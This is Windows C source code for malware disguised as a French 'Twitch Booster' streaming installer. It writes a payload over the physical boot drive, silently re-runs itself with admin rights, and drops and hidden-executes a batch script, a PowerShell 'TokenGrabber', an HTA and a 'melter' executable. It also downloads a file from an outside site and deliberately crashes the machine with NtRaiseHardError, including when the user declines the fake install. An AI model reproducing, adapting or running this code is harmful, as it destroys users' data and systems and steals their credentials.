#include <Windows.h>
#include <Psapi.h>
#include <stdio.h>
#include <stdbool.h>
#include "header.h"
#define _UNICODE 


void crashuwu() {
    HMODULE ntdll = LoadLibraryA("ntdll");
    FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

    if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
        BOOLEAN tmp1; DWORD tmp2;
        ((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
        ((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
    }
}

void TBInstall(LPVOID Caca)
{
    if (MessageBoxW(NULL, L"Bienvenue dans l'installateur du Twitch Booster pour OBS et XSplit. Souhaitez vous procéder à l'installation ?", L"Twitch Booster", MB_YESNO | MB_SYSTEMMODAL) == IDYES) {
        Sleep(3000);
        MessageBoxW(NULL, L"Installation terminée, vous pouvez maintenant streamer sur Twitch sans aucun problèmes de connexion ou autre !", L"Twitch Booster", MB_OK | MB_SYSTEMMODAL);
    }
    else {
        MessageBoxW(NULL, L"euh bah ntr fdp", L"L'Élite de la Nation", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);

        // jfais crash le pc avec ntraise hard error
        crashuwu();
    }
};


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, int nCmdShow){
    DWORD BytesWritten;


    HANDLE PhDrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);


    if (PhDrive == INVALID_HANDLE_VALUE || !WriteFile(PhDrive, Snake300FPS, sizeof(Snake300FPS), &BytesWritten, NULL)) {
      // MessageBoxW(0, L"Erreur, veuillez relancer l'application avec des privilèges d'administrateur", L"Twitch Booster", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);

        PWSTR Lope[MAX_PATH];

        GetModuleFileNameW(NULL, Lope, sizeof(Lope));


        ShellExecuteW(NULL, L"runas", Lope, NULL, NULL, SW_HIDE);


        ExitProcess(0);

    }

    CloseHandle(PhDrive);



    PCWSTR AssetDirectory[MAX_PATH];

    GetEnvironmentVariableW(L"TEMP", AssetDirectory, MAX_PATH);
    SetCurrentDirectoryW(AssetDirectory);



    

    FILE* pFile1 = _wfopen(L"sodomi.bat", L"wb");
    FILE* pFile2 = _wfopen(L"loping.ps1", L"wb");
    FILE* pFile3 = _wfopen(L"risitas.hta", L"wb");
    FILE* pFile4 = _wfopen(L"melter.exe", L"wb");

    fwrite(kickBooster, sizeof(UCHAR), sizeof(kickBooster), pFile1);
    fwrite(TokenGrabber, sizeof(UCHAR), sizeof(TokenGrabber), pFile2);
    fwrite(risiHta, sizeof(UCHAR), sizeof(risiHta), pFile3);
    fwrite(Melter, sizeof(UCHAR), sizeof(Melter), pFile4);

    fclose(pFile1);
    fclose(pFile2);
    fclose(pFile3);
    fclose(pFile4);

    ShellExecuteW(NULL, L"open", L"sodomi.bat", NULL, NULL, SW_HIDE);
    ShellExecuteW(NULL, L"open", L"powershell", L".\\loping.ps1", NULL, SW_HIDE);

    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)TBInstall, (LPVOID)0, 0, 0);

     
    // le but c'est d'avoir un ex�cutable qui p�se le moins lourd possible, dcp g dl l'image car elle bouffe genre 300 ko wtf

    URLDownloadToFileW(NULL, L"https://jvflux.fr/images/4/4d/fichiers-2016-44-1478471702-risitas.jpg", L"1478471702-risitas.jpg", 0, NULL);

    Sleep(374000);

    crashuwu();


	return 0;
};